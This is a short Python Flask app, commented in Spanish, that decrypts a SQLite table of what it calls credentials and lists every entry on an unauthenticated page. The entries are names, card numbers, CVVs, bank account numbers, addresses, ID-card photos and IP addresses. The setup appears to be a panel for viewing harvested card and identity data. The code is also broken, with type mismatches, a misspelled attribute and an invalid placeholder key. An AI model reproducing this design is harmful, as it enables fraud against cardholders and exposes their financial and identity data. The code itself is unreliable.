from flask import Flask, render_template
from sqlalchemy import create_engine, Column, String, Float, Integer
from db import Base
from sqlalchemy.orm import sessionmaker
from cryptography.fernet import Fernet

app = Flask(__name__)

# Clave de encriptación (reemplazar por tu propia clave generada en genkey.py)
key = b'your-secret-key'
cipher_suite = Fernet(key)

class DatosURL(Base):
    __tablename__ = 'datosurl'
    id = Column(String, primary_key=True)
    user_name = Column(String)
    codigo_zip = Column(String)
    credit_card_num = Column(Integer)
    credit_card_cvv = Column(Integer)
    cuenta_numero = Column(Integer)
    direccion = Column(String)
    foto_dni = Column(String)
    ip = Column(Float)
    cantidad_compras_realizadas = Column(String)

    def decrypt_data(self):
        decrypted_data = {}
        decrypted_data['id'] = self.id
        decrypted_data['user_name'] = cipher_suite.decrypt(self.user_name.encode()).decode()
        decrypted_data['codigo_zip'] = cipher_suite.decrypt(self.codigo_zip.encode()).decode()
        decrypted_data['credit_card_num'] = cipher_suite.decrypt(self.credit_card_num.encode()).decode()
        decrypted_data['credit_card_cvv'] = cipher_suite.decrypt(self.credit_card_cvv.encode()).decode()
        decrypted_data['cuenta_numero'] = cipher_suite.decrypt(self.cuenta_numero.encode()).decode()
        decrypted_data['direccion'] = cipher_suite.decrypt(self.direccion.encode()).decode()
        decrypted_data['foto_dni'] = cipher_suite.decrypt(self.foto_dni.encode()).decode()
        decrypted_data['ip'] = cipher_suite.decrypt(self.ip.encode()).decode()
        decrypted_data['cantidad_compras_realizadas'] = cipher_suite.decrypt(self.ccantidad_compras_realizadas.encode()).decode()
        return decrypted_data


class DatabaseConnector:
    def __init__(self, db_file):
        self.db_file = db_file
        self.engine = None
        self.session = None

    def connect(self):
        self.engine = create_engine('sqlite:///' + self.db_file)
        Base.metadata.create_all(self.engine)
        Session = sessionmaker(bind=self.engine)
        self.session = Session()

    def disconnect(self):
        if self.session:
            self.session.close()

    def get_data(self):
        data = self.session.query(DatosURL).all()
        decrypted_data = [entry.decrypt_data() for entry in data]
        return decrypted_data


db_connector = DatabaseConnector("credenciales.sqlite")
db_connector.connect()


@app.route('/static')
def mostardata():
    data = db_connector.get_data()
    return render_template('dataurl.html', data=data)


if __name__ == '__main__':
    app.run()
